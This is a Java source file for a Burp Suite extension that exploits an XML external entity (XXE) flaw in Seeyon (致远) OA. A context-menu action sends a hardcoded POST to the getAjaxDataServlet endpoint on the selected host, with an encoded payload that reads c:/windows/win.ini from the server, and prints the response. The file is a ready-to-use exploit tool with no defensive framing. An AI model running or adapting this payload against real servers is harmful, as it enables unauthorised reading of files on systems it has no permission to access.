package burp;

import javax.swing.*;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class BurpExtender implements IBurpExtender{
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private ExecutorService executor;

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks iBurpExtenderCallbacks) {
        // keep a reference to our callbacks object
        this.callbacks = iBurpExtenderCallbacks;
        // obtain an extension helpers object
        helpers = callbacks.getHelpers();

        // set our extension name
        callbacks.setExtensionName("致远OAXXE漏洞");

        // register ourselves as a custom scanner check
        callbacks.registerContextMenuFactory(new MyContextMenuFactory(callbacks));
        // 创建一个包含固定数量线程的线程池
        executor = Executors.newFixedThreadPool(1);
    }

    class MyContextMenuFactory implements IContextMenuFactory {

        private IBurpExtenderCallbacks callbacks;

        public MyContextMenuFactory(IBurpExtenderCallbacks callbacks) {
            this.callbacks = callbacks;
        }

        @Override
        public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
            IHttpRequestResponse[] messages = invocation.getSelectedMessages();
            callbacks.printOutput("messages count: " + messages.length);
            List<JMenuItem> menuItems = new ArrayList<>();
            if (messages != null && messages.length > 0) {
                JMenuItem menuItem = new JMenuItem("Send Request");
                menuItem.addActionListener(e -> {
                    // 在新线程中执行网络请求
                    executor.execute(new Runnable() {
                        @Override
                        public void run() {
                            doCheck(messages[0]);
                        }
                    });
                });

                menuItems.add(menuItem);
            }
            return menuItems;
        }

        public void doCheck(IHttpRequestResponse baseRequestResponse) {
            try {
                sendRequest(baseRequestResponse);

            }catch (Exception exception){
                callbacks.printOutput(exception.getMessage());
            }
        }

        private void sendRequest(IHttpRequestResponse baseRequestResponse) {
            // 准备请求数据
            RequestModel model = getRequestModel();
            String host = helpers.analyzeRequest(baseRequestResponse).getUrl().getHost();
            int port = helpers.analyzeRequest(baseRequestResponse).getUrl().getPort();
            String VULNERS_API_HOST = host + ":" + port;
            model.getHeaders().add("Host: " + VULNERS_API_HOST);
            byte[] request = helpers.buildHttpMessage(model.getHeaders(), model.getDateBytes());
            callbacks.printOutput(new String(request));
            callbacks.printOutput("-----------------------------------------------------------");
            byte[] responseBytes = callbacks.makeHttpRequest(host, port, false, request);
            // 处理响应，比如输出到控制台
            if(null!=responseBytes && responseBytes.length>0) {
                String responseStr = new String(responseBytes);
                callbacks.printOutput("RESPONSE: " + responseStr);
            }else {
                callbacks.printOutput("NO RESPONSE: " );
            }

        }


        private RequestModel getRequestModel() {
            // 生成报文
            RequestModel model=new RequestModel();
            model.setHeaders(new ArrayList<String>());
            model.getHeaders().clear();

            String payload="S=ajaxColManager&M=colDelLock&imgvalue=lr7V9+0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=%3C%3Fxml+version%3D%221.0%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A++%3C%21ELEMENT+foo+ANY+%3E%0D%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%0D%0A%5D%3E%0D%0A%3CSignature%3E%3CField%3E%3Ca+Index%3D%22ProtectItem%22%3Etrue%3C%2Fa%3E%3Cb+Index%3D%22Caption%22%3Ecaption%3C%2Fb%3E%3Cc+Index%3D%22ID%22%3Eid%3C%2Fc%3E%3Cd+Index%3D%22VALUE%22%3E%26xxe%3B%3C%2Fd%3E%3C%2FField%3E%3C%2FSignature%3E";
            model.getHeaders().add("POST /seeyon/m-signature/RunSignature/run/getAjaxDataServlet HTTP/1.1");
            model.getHeaders().add("User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36");
            model.getHeaders().add("Accept-Language: zh-CN,zh;q=0.9");
            model.getHeaders().add("X-Requested-With: XMLHttpRequest");
            model.getHeaders().add("Content-type: application/x-www-form-urlencoded");
            model.setDateBytes(payload.getBytes());

            return model;
        }

    }
}
